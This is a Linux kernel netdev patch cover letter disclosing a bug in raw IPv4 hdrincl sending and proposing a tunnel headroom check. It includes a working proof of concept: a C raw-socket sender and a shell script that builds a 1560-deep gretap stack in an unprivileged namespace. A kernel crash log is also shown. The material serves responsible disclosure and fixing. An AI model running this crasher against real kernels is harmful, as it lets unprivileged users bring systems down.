Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 702DF2C21FF
	for <netdev@vger.kernel.org>; Sun,  2 Aug 2026 18:50:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785696637; cv=none; b=pFNDSbcbAYDkpR5S0o7IKMzJtVNjxJ+Ot5dvtIaIWeLfCznsGR2tSdb21A8UPGuf0JgGZBX7mkZVNuaNJK01yxZNa/oqzLj5vzOk99CgSwhFygyPf6g+ssPuSJaRbpQe/r05xuX3uTRUx2jAD8cQzFFoItMZ+He/EQ6GDMXExpI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785696637; c=relaxed/simple;
	bh=53pAORPmaAPrzX8X62sp3A8MMT19B1BLedUXdsfqF1s=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qYAMdE9gBbiHIT0SvI5+rlyyADWSpcdUwq0YGFmQJgeolvh5GxwVOaRZFPK3TOQ0kbJlIXQldgxsnWSks8RGXP8l54+30VhUa/cGs7wFNj33saE/qLIlL5D+FBAvRzHrqLlBh6vqS+FGAyHlgKB1MVvHBj2ZN+h/nQ+aj/PEOJc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=JM7g7VX5; arc=none smtp.client-ip=209.85.216.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="JM7g7VX5"
Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-38de840f2f0so1649778a91.0
        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 11:50:35 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785696635; x=1786301435; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=6irk+suRFzUVjUivt9Y8sJ2O5S8J7/rhO3kkQB6egcY=;
        b=JM7g7VX5kArm0oZuaYXUNnzgI1CpHVZT9QBkstbsut3UTg6sF5c8wV/AfRXzuEydbh
         ardRmo3EsxEOQLEFDKsOjYT0yX213wFYRFvnPACZet7qT0bapleo7XlsOGBbPP2O97ez
         AkCu7iFi03j6YWj2zzKirQItiUE0MRvbQQUceRQLfqCeOj+47fVuh1zXB7gG7N0XdauN
         8YvT19nddPbz/1KHXbbz4VeBcheFL7OS3X/m5JPxXcJP2wfUKjF6Ko5H2T99/89GsaUo
         1SDVvt3Bs+LhGB/ZrjMErv2PxenW7SujOXl5CCkXsDsf0+FE6rr3aKtaXiBy6KXY4FSN
         nqug==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785696635; x=1786301435;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=6irk+suRFzUVjUivt9Y8sJ2O5S8J7/rhO3kkQB6egcY=;
        b=bnC3g02RMsfYucJbWC0MndkBJ/VQ+K/4dR4Jcj0j22TdnN6QP1heARuYJ8JJBPkmbD
         jQm1gk6edu10Nlf09M5igpOGaZwM0FR57OvdL6YlolpAbfA9n8EFGSZpLDS1VMwQBceG
         eGK3KU0XbYFSZTszzWfJgz6qosHNCfcDauYp2g0r42DaOBRNmo4JQe1PT17NJRRllc+T
         nxr9wMEmiND0VnQhNN8q5rM5I1P9v674qStFTbZLBXWrelqvy3ruoh7oqns0YT2wHTpf
         L5+IQeFJs0zg22ySgekpklnblZV+9hHv9eEb+YGZ8pX+7xS+gYtmUigCzcioHIjztQbb
         vysQ==
X-Gm-Message-State: AOJu0YwyyPBA8xjDpdqSPTi+YL12kCBLBxk4Ph1lkKaWtfruZ3Nahxkr
	K+IVJRrCgQ1s6rT6D34Smlc6je4KJfcsbQTx5EAzvke2xWeb7ecwiiJp8II9gxCWxFhNBBus9we
	N+8qVKFBq
X-Gm-Gg: AR+sD11GsYT6reH1ioon6tutVMFoDz00BTDF23JU4qXDuVZ6zv0259z85NGakhaLMyu
	8AaLBbGH/bF87mBcuUWUBfrg/FjGmrS5i51TdpBoL1FK+ZIbg6i4RVqXcPDB13fauXJwpnAjQnj
	1aHcGiMEtP2679zwXoZbkyAB6B4dYVfGFxfRqQWZCIbLACAcRJ9+/IyHedX375Fo28frjtqqaLK
	PYSxBvVseW6RIab5Xu4z9XXk5RwKZoWa1wzU2eV5un/+7NvwZUHFUADdxD6WJ+Nqb2CH8l39SSq
	kQ/IGE3CX3yRzLCIQHcRonqM/+TUR6o1lkXXbWWSFzu7RvnC0Jm7BLsA3NvwtNRH/hpRnjz+Vfr
	kfBX8Ro6rf8I9kI+XohpHtGt03UjiBn0gFbmUhX45icnNKo13lYnptxTJV8wc2Aacff8WnpqFS8
	unZnLLFh+BU2ExQDOMqaaiSVWWd/NMEQBlvSkkHlh082AXc2dWb4LTtdwHPM24eijIws9trQ==
X-Received: by 2002:a17:90a:ec87:b0:38e:5741:5173 with SMTP id 98e67ed59e1d1-38fbc511a56mr6487245a91.29.1785696634509;
        Sun, 02 Aug 2026 11:50:34 -0700 (PDT)
Received: from localhost.localdomain ([115.192.251.96])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb29cbac9sm2961867a91.7.2026.08.02.11.50.24
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 11:50:33 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	kuniyu@google.com,
	gustavoars@kernel.org,
	runyu.xiao@seu.edu.cn,
	jlayton@kernel.org,
	michael.bommarito@gmail.com,
	kees@kernel.org,
	willemb@google.com,
	lirongqing@baidu.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v3 0/1] net: ip_tunnel: reject excessive tunnel stacking headroom
Date: Sun,  2 Aug 2026 18:49:16 +0000
Message-ID: <cover.1785691607.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/raw.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

raw_send_hdrinc() and rawv6_send_hdrinc() reserve LL headroom before storing
skb header offsets in 16-bit fields. Since commit 1a37e412a022 ("net: Use
16bits for *_headers fields of struct skbuff"), these offsets must stay
representable, and U16_MAX is also the unset sentinel for transport_header.

The reproducer builds a very deep gretap stack. Each IPv4 tunnel derives its
needed_headroom from the lower device in ip_tunnel_bind_dev(), so the final
LL_RESERVED_SPACE(dev) can grow beyond what the skb header offset fields can
represent. On the IPv4 hdrincl path, skb_reserve(skb, hlen) followed by
skb_reset_network_header(skb) then stores a truncated network_header offset.
raw_send_hdrinc() copies the userspace IPv4 header to ip_hdr(skb) at the
wrapped offset, and the malformed skb later faults in eth_header().

IPv4 also has a second boundary at hlen + iphlen, because the transport heade
is advanced by the user-controlled IPv4 header length and U16_MAX itself is
not a valid stored transport offset.

This version rejects IPv4 tunnel configurations when the computed tunnel
headroom would make LL_RESERVED_SPACE(dev) exceed the skb header offset range
needed by raw IPv4 hdrincl. That rejects the bad gretap stack at control time
instead of adding checks to later per-packet hot paths. Small raw IPv4 and
IPv6 hdrincl guards remain as a final bound check for devices that are not
created through the IPv4 tunnel control path.

The reproducer below exercises the IPv4 hdrincl crash path. The primary fix
is the IPv4 tunnel control-time headroom check; the raw IPv6 change is only a
matching hdrincl boundary guard and is not covered by the same crash log.

We did not use packetdrill for the reproducer because the trigger depends on
constructing a very deep gretap device stack so that LL_RESERVED_SPACE(dev)
reaches the truncation boundary before the raw hdrincl send. packetdrill can
express the final packet send, but not this device-topology setup as the main
trigger condition.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc
    Actual trigger wrapper used in validation:
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <netinet/ip.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static uint16_t ip_checksum(const void *buf, size_t len)
{
	const uint8_t *p = buf;
	uint32_t sum = 0;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | p[1];
		p += 2;
		len -= 2;
	}

	if (len)
		sum += (uint32_t)p[0] << 8;

	while (sum >> 16)
		sum = (sum & 0xffffU) + (sum >> 16);

	return (uint16_t)~sum;
}

int main(int argc, char **argv)
{
	static const char payload[] = "ABCD";
	const char *ifname = argc > 1 ? argv[1] : "g1560";
	const char *dst_str = argc > 2 ? argv[2] : "192.0.2.2";
	const char *src_str = argc > 3 ? argv[3] : "192.0.2.1";
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
	};
	struct iphdr iph = {
		.version = 4,
		.ihl = 5,
		.tos = 0,
		.tot_len = htons(sizeof(struct iphdr) + sizeof(payload) - 1),
		.id = htons(0x1234),
		.frag_off = 0,
		.ttl = 64,
		.protocol = 253,
		.check = 0,
	};
	unsigned char packet[sizeof(iph) + sizeof(payload) - 1];
	int fd;
	ssize_t n;

	if (inet_pton(AF_INET, src_str, &iph.saddr) != 1) {
		fprintf(stderr, "bad src %s\n", src_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &iph.daddr) != 1) {
		fprintf(stderr, "bad dst %s\n", dst_str);
		return 1;
	}
	if (inet_pton(AF_INET, dst_str, &dst.sin_addr) != 1) {
		fprintf(stderr, "bad sockaddr dst %s\n", dst_str);
		return 1;
	}

	iph.check = ip_checksum(&iph, sizeof(iph));
	memcpy(packet, &iph, sizeof(iph));
	memcpy(packet + sizeof(iph), payload, sizeof(payload) - 1);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	{
		int one = 1;

		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
			perror("setsockopt(IP_HDRINCL)");
			close(fd);
			return 1;
		}
		if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ifname,
			       strlen(ifname) + 1) < 0) {
			perror("setsockopt(SO_BINDTODEVICE)");
			close(fd);
			return 1;
		}
	}

	n = sendto(fd, packet, sizeof(packet), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	if (n < 0) {
		perror("sendto");
		close(fd);
		return 1;
	}

	printf("sent %zd bytes via %s to %s\n", n, ifname, dst_str);
	close(fd);
	return 0;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${DEPTH:-1560}"
TOP="g${DEPTH}"

if ip route show default 2>/dev/null | grep -q .; then
	echo "run inside an isolated netns, e.g. unshare -n $0 or unshare -Urn $0" >&2
	exit 1
fi

ip link add dummy0 type dummy
ip link set dummy0 up mtu 100000

lower="dummy0"
i=1
while [ "$i" -le "$DEPTH" ]; do
	a=$(( (i / 250) % 250 + 1 ))
	b=$(( i % 250 + 1 ))
	lip="10.${a}.${b}.1"
	rip="10.${a}.${b}.2"
	ip link add "g${i}" type gretap local "${lip}" remote "${rip}" dev "${lower}" key 1
	lower="g${i}"
	i=$((i + 1))
done

ip link set "${TOP}" up
ip addr add 192.0.2.1/24 dev "${TOP}"
ip neigh replace 192.0.2.2 lladdr 02:11:22:33:44:55 nud permanent dev "${TOP}"

exec ./poc "${TOP}" 192.0.2.2 192.0.2.1
------END poc.sh--------

----BEGIN crash log----
[   52.208710] BUG: unable to handle page fault for address: ffffa3986611fffe
[   52.220274] #PF: supervisor write access in kernel mode
[   52.228822] #PF: error_code(0x0002) - not-present page
[   52.249792] Oops: Oops: 0002 [#1] SMP NOPTI
[   52.313650] RIP: 0010:eth_header (net/ethernet/eth.c:86)
[   52.585894] Call Trace:
[   52.591902]  neigh_resolve_output (include/linux/netdevice.h:3503 net/core/neighbour.c:1611 net/core/neighbour.c:1596)
[   52.597910]  ip_finish_output2 (include/net/neighbour.h:560 (discriminator 2) net/ipv4/ip_output.c:236 (discriminator 2))
[   52.603665]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
[   52.616159]  raw_sendmsg (net/ipv4/raw.c:677)
[   52.638531]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
[   52.643321]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
[   52.648330]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   52.653123]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-----END crash log-----

Best regards,
Zihan Xi

changes in v3:
  - Rework the fix to reject excessive IPv4 tunnel headroom at
    configuration time, following Willem de Bruijn's feedback.
  - Drop the broad skb/XFRM/GSO/ESP/IPTFS runtime checked-helper changes
    from v2.
  - Keep only small raw hdrincl guards as a final bound check.
  - v2 Link: https://lore.kernel.org/all/cover.1785529351.git.zihanx@nebusec.ai/
changes in v2:
  - Keep skb_segment() default error code after successful checked skb offset
    updates to avoid returning ERR_PTR(0), as reported by the kernel test
    robot.
  - Extend the checked update coverage to XFRM, ESP offload, and IPTFS
    transport-header recomputation paths instead of relying on raw hdrincl
    entry guards alone.
  - v1 Link: https://lore.kernel.org/all/cover.1785346409.git.zihanx@nebusec.ai/

---
 net/ipv4/ip_vti.c        |   4 +-
 net/ipv4/ipip.c          |   4 +-
 net/ipv4/raw.c           |   3 +
 net/ipv6/raw.c           |   4 ++
 7 files changed, 111 insertions(+), 55 deletions(-)

-- 
2.43.0

